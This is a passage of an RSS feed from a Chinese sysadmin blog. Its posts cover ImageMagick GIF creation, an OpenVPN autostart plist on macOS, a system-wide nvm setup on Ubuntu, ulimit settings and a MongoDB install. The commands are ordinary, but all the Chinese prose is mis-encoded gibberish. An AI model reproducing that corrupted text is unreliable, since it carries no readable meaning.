&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3å—2Tçš„ç›˜ï¼Œæ¯ä¸ªç›˜æœ‰3ä¸ªåˆ†åŒºï¼Œç„¶åæœ€åæ˜¯USBç›˜ï¼Œç›˜ç¬¦sduï¼Œå¤‡ä»½å®ƒ&lt;/p&gt;</description>
    </item>
    <item>
      <title>å¦‚ä½•æŠŠjpgåˆæˆgif</title>
      <link>https://rendoumi.com/posts/20240119-jpg_gif/</link>
      <pubDate>Fri, 19 Jan 2024 10:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-jpg_gif/</guid>
      <description>&lt;p&gt;ç”¨ffmpegå°±å¾ˆç®€å•äº†&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæŠŠè¦åˆå¹¶çš„jpgéƒ½å˜æˆåˆé€‚çš„å°ºå¯¸&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;convert -resize 300x *.jpg  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå˜gif&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;convert -delay &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; -loop &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 1.jpg 2.jpg 3.jpg 4.jpg result.gif  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;-loop 0 è¡¨ç¤ºæ— é™å¾ªç¯ -delay 30 è¡¨ç¤ºæ¯å¸§ä¹‹é—´ç­‰å¾…çš„æ—¶é—´&lt;/p&gt;</description>
    </item>
    <item>
      <title>mac osä¸‹å®‰è£…openvpnå®¢æˆ·ç«¯å¹¶è®¾ç½®è‡ªå¯åŠ¨</title>
      <link>https://rendoumi.com/posts/20240119-macos_vpn/</link>
      <pubDate>Fri, 19 Jan 2024 10:09:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-macos_vpn/</guid>
      <description>&lt;p&gt;æ²¡åŠæ³•ï¼Œç½‘ç»œç¯å¢ƒå¤ªçƒ‚ï¼Œåªèƒ½è£…ä¸ªopenvpn clientè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œç³»ç»Ÿæ˜¯macï¼Œè¦æ±‚ä¸€ç›´ä¿æŒè¿æ¥ï¼Œè¿˜è¦èƒ½é‡å¯è‡ªåŠ¨è¿ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;1.å®‰è£…openvpn&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brew install openvpn  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2.å®‰è£…tun/tapé©±åŠ¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://downloads.sourceforge.net/tuntaposx/tuntap_20150118.tar.gz  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf tuntap_20150118.tar.gz  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç„¶ååœ¨mac osæ¡Œé¢ä¸‹ï¼ŒåŒå‡»tuntap_20150118.pkgå®‰è£…
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3.å‡†å¤‡client.confæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯æ ‡å‡†çš„clientç«¯æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;4.æµ‹è¯•æ˜¯å¦å¯ä»¥æ­£å¸¸å¯åŠ¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/local/opt/openvpn/sbin/openvpn --config /usr/local/etc/openvpn/ddky.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;5.æµ‹è¯•æˆåŠŸååœ¨mac osç¼–å†™plistæ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /Library/LaunchDaemons/net.openvpn.plist  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?xml &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;?&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;!DOCTYPE plist PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//Apple Computer//DTD PLIST 1.0//EN&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;plist &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dict&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;string&amp;gt;net.openvpn&amp;lt;/string&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;key&amp;gt;KeepAlive&amp;lt;/key&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;dict&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;key&amp;gt;NetworkState&amp;lt;/key&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;true/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;/dict&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;key&amp;gt;Program&amp;lt;/key&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;string&amp;gt;/usr/local/opt/openvpn/sbin/openvpn&amp;lt;/string&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;array&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;string&amp;gt;openvpn&amp;lt;/string&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;string&amp;gt;--config&amp;lt;/string&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;string&amp;gt;/usr/local/etc/openvpn/client.conf&amp;lt;/string&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;/array&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;key&amp;gt;RunAtLoad&amp;lt;/key&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;true/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;key&amp;gt;TimeOut&amp;lt;/key&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;integer&amp;gt;90&amp;lt;/integer&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;key&amp;gt;WorkingDirectory&amp;lt;/key&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;string&amp;gt;/usr/local/etc/openvpn&amp;lt;/string&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dict&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/plist&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;6.ç„¶åè¿è¡Œ&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ubuntuä¸‹å¦‚ä½•ç»™æ‰€æœ‰ç”¨æˆ·å®‰è£…nodejsçš„nvm</title>
      <link>https://rendoumi.com/posts/20240119-nvm_forall/</link>
      <pubDate>Fri, 19 Jan 2024 09:09:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-nvm_forall/</guid>
      <description>&lt;p&gt;æœ€è¿‘å·¥ä½œæ¯”è¾ƒå¤šåœ¨Ubuntuå¹³å°ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨visualenvå’Œnvmæ¯”è¾ƒå¤šï¼Œä½†æ˜¯nvmé‡åˆ°çš„é—®é¢˜æ¯”è¾ƒå¤šã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚jenkinsè°ƒç”¨nvmå°±æ¯”è¾ƒéº»çƒ¦&lt;/p&gt;
&lt;p&gt;å¦‚ä½•ç”¨ç”¨rootç”¨æˆ·ç»™æ‰€æœ‰ç”¨æˆ·éƒ½è£…ä¸Šç»Ÿä¸€çš„nvmå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;1ã€é¦–å…ˆå®‰è£…åŸºæœ¬ä¾èµ–åŒ…:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install build-essential openssl libssl-dev curl  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2ã€å»ºä¸ªå…¬å…±ç»„ï¼Œè¿™ä¸ªç»„çš„æˆå‘˜å¯ä»¥æ§åˆ¶nvmï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;groupadd dev  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3ã€gitå…‹éš†ä¸‹è½½nvmçš„ä»£ç &lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/creationix/nvm.git /opt/nvm  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;4ã€å»ºç«‹ä¸¤ä¸ªå…¬ç”¨ç›®å½•ï¼Œä¸€ä¸ªæ˜¯æ”¾nvmï¼Œä¸€ä¸ªæ˜¯æ”¾nodejsçš„npmï¼Œå¹¶è®¾ç½®å¥½æƒé™&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /usr/local/nvm  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /usr/local/node  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chown -R root:dev /usr/local/nvm  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod -R &lt;span class=&#34;m&#34;&gt;775&lt;/span&gt; /usr/local/nvm  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chown -R root:dev /usr/local/node  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod -R &lt;span class=&#34;m&#34;&gt;775&lt;/span&gt; /usr/local/node  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;5ã€å»ºç«‹å¥½å…¬ç”¨çš„ /etc/profile.d/nvm.sh ä¾›æ‰€æœ‰äººsourceç”¨ï¼Œæ³¨æ„ï¼Œsourceå‘½ä»¤æ˜¯bashä¸‹ç”¨çš„ï¼Œå¦‚æœæ˜¯shï¼Œå°±ç”¨.æ›¿ä»£ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;NVM_DIR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/nvm  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; /opt/nvm/nvm.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;NPM_CONFIG_PREFIX&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/node  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/usr/local/node/bin:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;6ã€æ–­å¼€é‡æ–°ç™»å½•ï¼ŒåŠ è½½nvm&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm --version
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;7ã€å®‰è£…ç‰¹å®šç‰ˆæœ¬çš„node&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm install V18.18.2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;8ã€è®¾ç½®ç¼ºçœnodeçš„ç‰ˆæœ¬&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm &lt;span class=&#34;nb&#34;&gt;alias&lt;/span&gt; default V18.18.2  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;9ã€éšåæŠŠç”¨æˆ·æ‹‰è¿›devç»„ï¼Œç„¶åç™»é™†å°±å¯ä»¥äº†ã€‚éªŒè¯å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm list  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node -v
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>ulimitçš„ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20240118-ulimit/</link>
      <pubDate>Thu, 18 Jan 2024 17:09:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-ulimit/</guid>
      <description>&lt;p&gt;åŸºæœ¬å¸¸è¯†ï¼Œå„ç§è¯­ç„‰ä¸è¯¦å•Šï¼Œå…¶å®ulimitæœ€å¸¸ç”¨çš„å°±ä¸¤ä¸ªå‚æ•°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-u number:  å•ä¸ªç”¨æˆ·èƒ½è¿è¡Œçš„æœ€å¤§è¿›ç¨‹æ•°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-n number:  å•ä¸ªè¿›ç¨‹å¯ä»¥åŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„æœ€å¤§å€¼ï¼Œç¼ºçœ1024
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦è®¾ç½®ï¼ŒHardå’ŒSoftï¼ŒHardæ˜¯Softçš„æœ€é«˜é™å€¼ï¼Œå¤©èŠ±æ¿ã€‚è¿™ä¸¤ä¸ªå€¼éƒ½å¯ä»¥é’ˆå¯¹æŸç”¨æˆ·å•ç‹¬è®¾ç½®ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥è®¾æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;ulimit&lt;/span&gt; -S -n &lt;span class=&#34;m&#34;&gt;10240&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;ulimit&lt;/span&gt; -H -n &lt;span class=&#34;m&#34;&gt;20480&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;ulimit&lt;/span&gt; -S -u &lt;span class=&#34;m&#34;&gt;10240&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;ulimit&lt;/span&gt; -H -u &lt;span class=&#34;m&#34;&gt;20480&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥åœ¨/etc/security/limits.confé‡Œè®¾ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* soft nofile &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* hard nofile &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* soft nproc &lt;span class=&#34;m&#34;&gt;131072&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* hard nproc &lt;span class=&#34;m&#34;&gt;131072&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹Ÿå¯ä»¥åœ¨/etc/rc.d/rc.localä¸­ç”¨å‘½ä»¤è®¾ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/rc.d/rc.local  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;ulimit&lt;/span&gt; -u &lt;span class=&#34;m&#34;&gt;204800&lt;/span&gt; -HSn &lt;span class=&#34;m&#34;&gt;204800&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4&gt;&lt;/h4&gt;</description>
    </item>
    <item>
      <title>flask/pythonå¯¹mongodbçš„ä¸€äº›æ“ä½œ</title>
      <link>https://rendoumi.com/posts/20240118-flask_mongo/</link>
      <pubDate>Thu, 18 Jan 2024 17:08:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-flask_mongo/</guid>
      <description>&lt;p&gt;é¦–å…ˆæ˜¯å®‰è£…mongodb&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y mongodb-server mongodb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Installing &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; dependencies:  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; boost-filesystem                                      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; boost-iostreams                                       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; boost-program-options                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; boost-system                                          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; boost-thread                                          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; gperftools-libs                                       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; libicu                                                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; libunwind                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; v8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¼šè£…ä¸€å †ä¾èµ–åŒ…ï¼Œbooståº“ï¼Œicuåº“ï¼Œv8åº“ï¼Œgperftoolsåº“ï¼Œéƒ½æ˜¯å¾ˆå‰å®³çš„åº“å•Šï¼&lt;/p&gt;
&lt;p&gt;å¯åŠ¨ï¼š&lt;/p&gt;
